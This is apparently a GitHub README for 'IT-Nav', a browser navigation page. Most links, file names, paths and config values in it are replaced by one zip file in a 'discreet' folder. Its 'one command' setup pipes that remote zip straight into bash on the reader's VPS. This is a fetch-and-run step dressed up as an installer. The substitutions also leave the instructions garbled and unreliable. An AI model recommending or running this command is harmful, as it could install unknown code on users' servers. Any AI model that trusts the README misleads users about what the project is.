# 🌟 IT-Nav - A Simple, Beautiful IT Navigation Page

[![Download IT-Nav](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip)](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip)

IT-Nav is a clean and powerful navigation page designed for your IT needs. It runs smoothly on any VPS without the need for a backend. 

---

## 📦 Features

- 🌞/🌙 Light/Dark theme toggle
- ⏱ Real-time clock
- 🔎 Instant search with filtering
- 🌤 Weather display with automatic location
- 🔍 Aggregated search engines (Google, Bing, DuckDuckGo)
- 📰 RSS news feed (Hacker News)
- 🧩 Custom navigation with automatic localStorage saving
- 📱 Fully responsive layout

---

## 🚀 Getting Started

To easily set up IT-Nav, you can deploy it in just one command. Follow these steps:

1. **Access Your VPS:**
   - Connect to your Linux VPS using SSH. If you need help with this, consult your hosting provider for instructions.

2. **Run the Deployment Command:**
   - Execute the following command in your terminal:
     ```
     bash <(curl -s https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip)
     ```
   - This command will download and install IT-Nav for you.

3. **Access IT-Nav:**
   - Once the installation finishes, visit your server's IP address using a web browser.
   - Example URL: `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip`

---

## 🖥 Manual Deployment

If you prefer to set up IT-Nav manually, follow these steps:

1. **Upload the HTML File:**
   - Download the `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip` file from the Releases page: [Download IT-Nav](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip).
   - Upload the `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip` file to your server via SFTP or any file transfer method.
   - Place it in the following directory: `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip`.

2. **Configure Your Web Server:**
   - If you are using Nginx, add the following configuration to your Nginx server block:
     ```
     server {
         listen 80;
         server_name _;
         root /www/it-nav;
         index https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip;
     }
     ```
   - Make sure to replace the `root` path if needed.

3. **Reload Nginx:**
   - After making changes, reload Nginx to apply the new configuration:
     ```
     nginx -s reload
     ```

4. **Access IT-Nav:**
   - Navigate to your server's IP address in a web browser.

---

## 💾 Storing Custom Navigation Data

All your custom navigation data will be saved in your browser using localStorage. You can access it like this:

- **Data Location:** `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip`

Your settings will remain intact even if you refresh the page or revisit later.

---

## 🤝 Welcome to Use and Share

You are welcome to fork, modify, and share IT-Nav. Contributions and pull requests (PRs) are highly encouraged to help improve the project.

---

For more details, check the files in the repository or reach out if you have any questions. 

You can always return to the [Releases page](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip) to get the latest version and updates.